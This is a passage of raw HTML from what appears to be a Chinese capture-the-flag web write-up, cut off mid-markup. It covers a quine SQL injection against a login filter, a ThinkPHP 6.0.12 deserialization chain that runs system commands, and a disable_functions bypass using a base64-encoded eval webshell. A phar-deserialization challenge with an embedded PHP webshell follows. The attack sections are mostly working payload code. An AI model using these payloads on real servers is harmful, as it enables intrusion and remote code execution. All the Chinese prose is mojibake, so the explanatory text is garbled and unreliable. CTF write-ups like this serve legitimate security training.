class=\"params\"><span class=\"variable\">$mes</span>, <span class=\"variable\">$url</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">die</span>(<span class=\"string\">&quot;&lt;script&gt;alert(&#x27;<span class=\"subst\">&#123;$mes&#125;</span>&#x27;);location.href=&#x27;<span class=\"subst\">&#123;$url&#125;</span>&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkSql</span>(<span class=\"params\"><span class=\"variable\">$s</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/if|regexp|between|in|flag|=|&gt;|&lt;|and|\\||right|left|insert|database|reverse|update|extractvalue|floor|join|substr|&amp;|;|\\\\\\$|char|\\x0a|\\x09|column|sleep|\\ /i&quot;</span>, <span class=\"variable\">$s</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"title function_ invoke__\">alertMes</span>(<span class=\"string\">&#x27;waf here&#x27;</span>, <span class=\"string\">&#x27;index.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>]) &amp;&amp; <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>] != <span class=\"string\">&#x27;&#x27;</span> &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;passwd&#x27;</span>]) &amp;&amp; <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;passwd&#x27;</span>] != <span class=\"string\">&#x27;&#x27;</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"variable\">$username</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"variable\">$password</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;passwd&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">if</span> (<span class=\"variable\">$username</span> !== <span class=\"string\">&#x27;bilala&#x27;</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"title function_ invoke__\">alertMes</span>(<span class=\"string\">&#x27;only bilala can login&#x27;</span>, <span class=\"string\">&#x27;index.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"title function_ invoke__\">checkSql</span>(<span class=\"variable\">$password</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;SELECT passwd FROM users WHERE username=&#x27;bilala&#x27; and passwd=&#x27;<span class=\"subst\">$password</span>&#x27;;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"variable\">$user_result</span> = <span class=\"title function_ invoke__\">mysqli_query</span>(<span class=\"variable\">$MysqlLink</span>, <span class=\"variable\">$sql</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"variable\">$row</span> = <span class=\"title function_ invoke__\">mysqli_fetch_array</span>(<span class=\"variable\">$user_result</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">if</span> (!<span class=\"variable\">$row</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"title function_ invoke__\">alertMes</span>(<span class=\"string\">&#x27;nothing found&#x27;</span>, <span class=\"string\">&#x27;index.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">if</span> (<span class=\"variable\">$row</span>[<span class=\"string\">&#x27;passwd&#x27;</span>] === <span class=\"variable\">$password</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">if</span> (<span class=\"variable\">$password</span> == <span class=\"string\">&#x27;b2f2d15b3ae082ca29697d8dcd420fd7&#x27;</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"keyword\">die</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"keyword\">die</span>(<span class=\"variable\">$FLAG</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"title function_ invoke__\">alertMes</span>(<span class=\"string\">&quot;wrong password&quot;</span>, <span class=\"string\">&#x27;index.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>å…³é”®åœ¨ä¼ å…¥çš„ passwd, è¦å¼ºç­‰äº password ä¸”ä¸ç­‰äº b2f2d15b3ae082ca29697d8dcd420fd7, è¿™é‡Œè¦æ§åˆ¶ passwd çš„è¾“å…¥è¾“å‡ºä¸€æ ·ï¼Œå°±éœ€è¦ quine æ³¨å…¥ï¼Œ<a href=\"https://hq185187.github.io/2023/05/12/nssctf2/#25hdctf-2023loginmaster\"> å…·ä½“è¿‡æ»¤çœ‹è¿™é‡Œ</a>ï¼Œè¿™é‡Œ char è¢«è¿‡æ»¤ç”¨ 0x æ›¿ä»£<br>\n payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;/**/union/**/select/**/replace(replace(&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;%&quot;,0x22,0x27),0x25,&quot;%&quot;)#&#x27;,0x22,0x27),0x25,&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;%&quot;,0x22,0x27),0x25,&quot;%&quot;)#&#x27;)#</span><br></pre></td></tr></table></figure>\n<h2 id=\"42ciscn-2022-åˆèµ›ezpop\"><a class=\"markdownIt-Anchor\" href=\"#42ciscn-2022-åˆèµ›ezpop\">#</a> 42.[CISCN 2022 åˆèµ›] ezpop</h2>\n<p>æ‰“å¼€å‘ç°æ˜¯ thinkphpv6.0.12 ç‰ˆæœ¬ï¼Œæ‰«ä¸€ä¸‹ç›®å½•å‘ç° www.zip, å¯ä»¥ä¸‹è½½æºç .<mark> æ­¤é¢˜è€ƒæŸ¥ thinkphp æ¡†æ¶å®¡è®¡ï¼Œæ‰¾ä¸ª exp</mark></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">think</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"title class_\">abstract</span> <span class=\"title class_\">class</span> <span class=\"title class_\">Model</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"title class_\">private</span> $<span class=\"title class_\">lazySave</span> = <span class=\"title class_\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">private</span> <span class=\"variable\">$data</span> = [];</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">private</span> <span class=\"variable\">$exists</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">protected</span> <span class=\"variable\">$table</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">private</span> <span class=\"variable\">$withAttr</span> = [];</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">protected</span> <span class=\"variable\">$json</span> = [];</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">protected</span> <span class=\"variable\">$jsonAssoc</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$obj</span> = <span class=\"string\">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"variable language_\">$this</span>-&gt;lazySave = True;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"variable language_\">$this</span>-&gt;data = [<span class=\"string\">&#x27;whoami&#x27;</span> =&gt; [<span class=\"string\">&#x27;cat /nssctfflag&#x27;</span>]];</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"variable language_\">$this</span>-&gt;exists = True;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"variable language_\">$this</span>-&gt;table = <span class=\"variable\">$obj</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"variable language_\">$this</span>-&gt;withAttr = [<span class=\"string\">&#x27;whoami&#x27;</span> =&gt; [<span class=\"string\">&#x27;system&#x27;</span>]];</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"variable language_\">$this</span>-&gt;json = [<span class=\"string\">&#x27;whoami&#x27;</span>,[<span class=\"string\">&#x27;whoami&#x27;</span>]];</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"variable language_\">$this</span>-&gt;jsonAssoc = True;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">model</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"title class_\">use</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">Model</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Pivot</span> <span class=\"keyword\">extends</span> <span class=\"title\">Model</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"title class_\">echo</span>(<span class=\"title class_\">urlencode</span>(<span class=\"title class_\">serialize</span>(<span class=\"title class_\">new</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">model</span>\\<span class=\"title class_\">Pivot</span>(<span class=\"title class_\">new</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">model</span>\\<span class=\"title class_\">Pivot</span>()))));</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"43gkctf-2020checkin\"><a class=\"markdownIt-Anchor\" href=\"#43gkctf-2020checkin\">#</a> 43.[GKCTF 2020]CheckIN</h2>\n<p><mark>æœ¬é¢˜è€ƒç‚¹ disable_function çš„ç»•è¿‡</mark><br>\nä»£ç å®¡è®¡ï¼Œä¼ ä¸ª Ginkgo, å†…å®¹ä¸º base64 ç¼–ç åçš„å‘½ä»¤</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">system(&#x27;whoami&#x27;);</span><br><span class=\"line\">system(&#x27;ls /&#x27;);</span><br><span class=\"line\">è¿™äº›éƒ½ä¸è¡Œ,systemå‡½æ•°åº”è¯¥è¢«ç¦ç”¨äº†</span><br><span class=\"line\"></span><br><span class=\"line\">å°è¯•phpinfo();</span><br><span class=\"line\">?Ginkgo=cGhwaW5mbygpOw==</span><br><span class=\"line\">ctrl+fæœç´¢disable_functionsæŸ¥çœ‹è¢«ç¦ç”¨çš„å‡½æ•°,ç³»ç»Ÿæ‰§è¡Œå‡½æ•°éƒ½è¢«ç¦ç”¨äº†</span><br><span class=\"line\"></span><br><span class=\"line\">æ¢æ€è·¯è¿èšå‰‘:eval($_POST[1]);</span><br><span class=\"line\">?Ginkgo=ZXZhbCgkX1BPU1RbMV0pOw==</span><br><span class=\"line\"></span><br><span class=\"line\">æ ¹ç›®å½•ä¸‹å¯ä»¥çœ‹åˆ°/flagä½†æ˜¯æƒé™æ˜¯700æ— æ³•è¯»å–,è€Œreadflagæ˜¯ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œä½†æ˜¯å› ä¸ºä¸€äº›å‡½æ•°è¢«ç¦ï¼Œæ‰€ä»¥æ— æ³•æ‰§è¡Œè¿™ä¸ªæ–‡ä»¶,æˆ‘ä»¬å¯ä»¥å°è¯•ç»•è¿‡disable_function</span><br><span class=\"line\"></span><br><span class=\"line\">php7ï¼ˆphp7.0-7.3ï¼‰ä¸­çš„å› ä¸ºåƒåœ¾å›æ”¶æœºåˆ¶(GC)é€ æˆçš„UAFæ¼æ´</span><br></pre></td></tr></table></figure>\n<p>GitHub ä¸Šæœ‰è„šæœ¬ï¼Œæ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ<br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21tMHIxL2V4cGxvaXRzL3RyZWUvbWFzdGVyL3BocDctZ2MtYnlwYXNz\"> php7-gc-bypass</span><br>\n æŠŠæ–‡ä»¶å†™å…¥ /tmp æ–‡ä»¶å¤¹ï¼Œå› ä¸ºåªæœ‰å®ƒæœ‰å†™çš„æƒé™</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&#x27;/tmp/1.php&#x27;);</span><br><span class=\"line\">?Ginkgo=aW5jbHVkZSgnL3RtcC8xLnBocCcpOw==</span><br></pre></td></tr></table></figure>\n<h2 id=\"44swpuctf-2021-æ–°ç”Ÿèµ›babyunser\"><a class=\"markdownIt-Anchor\" href=\"#44swpuctf-2021-æ–°ç”Ÿèµ›babyunser\">#</a> 44.[SWPUCTF 2021 æ–°ç”Ÿèµ›] babyunser</h2>\n<p><mark>è€ƒç‚¹:phar ååºåˆ—åŒ–</mark><br>\nå…³äº phar ååºåˆ—åŒ–çš„åŸºç¡€å¯ä»¥çœ‹è¿™ç¯‡åšå®¢<a href=\"\"> phar ååºåˆ—åŒ–</a></p>\n<p>å› ä¸ºä¼šæŠŠä¸Šä¼ çš„æ–‡ä»¶åŠ ä¸Š txt åç¼€ï¼Œä¸€å¼€å§‹æƒ³åˆ©ç”¨ phar æ–‡ä»¶åŒ…å«æ¼æ´è¯»å–å‹ç¼©åŒ…é‡Œé¢çš„é©¬ï¼Œå°è¯•æŠŠæœ¨é©¬æ–‡ä»¶å‹ç¼©æˆå‹ç¼©åŒ…ï¼Œzoe.zip, é‡Œé¢æœ‰ zoe.php, ä¸Šä¼ è¿›å»åï¼Œèšå‰‘è¿ä¸ä¸Šå»çš„ï¼Œ/upload/1500ea32e30d649b42e7d5ed6944fcbe.txt (å‹ç¼©åŒ…) å¯ä»¥è®¿é—®ï¼Œè€Œ /upload/1500ea32e30d649b42e7d5ed6944fcbe.txt/zoe.php è¿”å› 404, è€Œåœ¨ read.php é‡Œé¢è¯»å– phar://upload/1500ea32e30d649b42e7d5ed6944fcbe.txt/zoe.php å´å¯ä»¥ï¼Œå› æ­¤æ­¤é¢˜ä¸æ˜¯è€ƒæ–‡ä»¶åŒ…å«ï¼Œæ¢ä¸ªæ€è·¯:phar ååºåˆ—åŒ–</p>\n<p>é¦–å…ˆå¯ä»¥æ ¹æ®æŸ¥çœ‹æ–‡ä»¶è¯»å– read.phpï¼Œupload.php,<br>\nclass.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">aa</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name=<span class=\"string\">&#x27;aa&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name=<span class=\"title function_ invoke__\">strtolower</span>(<span class=\"variable\">$this</span>-&gt;name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ff</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$content</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$func</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;content=<span class=\"string\">&quot;\\&lt;?php @eval(\\$_POST[1]);?&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span>(<span class=\"params\"><span class=\"variable\">$key</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"variable\">$key</span>-&gt;&#123;<span class=\"variable language_\">$this</span>-&gt;func&#125;(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;cmd&#x27;</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">zz</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$filename</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$content</span>=<span class=\"string\">&#x27;surprise&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$filename</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;filename=<span class=\"variable\">$filename</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/^\\/|php:|data|zip|\\.\\.\\//i&#x27;</span>,<span class=\"variable\">$this</span>-&gt;filename))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;è¿™ä¸åˆç†&#x27;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">write</span>(<span class=\"params\"><span class=\"variable\">$var</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$filename</span>=<span class=\"variable language_\">$this</span>-&gt;filename;</span><br><span class=\"line\">        <span class=\"variable\">$lt</span>=<span class=\"variable language_\">$this</span>-&gt;filename-&gt;<span class=\"variable\">$var</span>;</span><br><span class=\"line\">        <span class=\"comment\">//æ­¤åŠŸèƒ½åºŸå¼ƒï¼Œä¸æƒ³å†™äº†</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getFile</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">filter</span>();</span><br><span class=\"line\">        <span class=\"variable\">$contents</span>=<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$this</span>-&gt;filename);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>(<span class=\"variable\">$contents</span>))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"variable\">$contents</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;404 not found&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;&#123;<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;method&#x27;</span>]&#125;(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;var&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;content;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">xx</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$arg</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name=<span class=\"string\">&#x27;eval&#x27;</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;arg=<span class=\"string\">&#x27;phpinfo();&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$name</span>,<span class=\"variable\">$arg</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$name</span>(<span class=\"variable\">$arg</span>[<span class=\"number\">0</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>upload.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span 